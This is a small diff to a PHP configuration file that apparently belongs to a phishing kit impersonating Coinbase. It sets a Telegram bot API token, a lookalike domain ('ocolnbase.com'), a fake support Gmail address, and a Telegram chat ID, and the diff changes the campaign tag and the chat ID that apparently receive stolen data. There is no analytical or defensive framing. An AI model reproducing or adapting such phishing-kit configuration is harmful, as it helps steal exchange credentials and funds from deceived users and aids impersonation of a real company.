@@ -3,8 +3,8 @@ define('API_KEY', '1847280168:AAGR9JY20lXvo44Xph9BrgAsYgwYnoJCy_E');
 //SET WEBSITE
 $config['title'] = 'Coinbase X SPM55';
 $config['url'] = 'https://ocolnbase.com';
-$config['parameter'] = 'spm55';
-$config['chat_id'] = '-649296951';
+$config['parameter'] = 'boyxd';
+$config['chat_id'] = '-771260425';
 $config['alex'] = 'on';
 $config['email_cs'] = 'contact.us.coinbase@gmail.com';
 
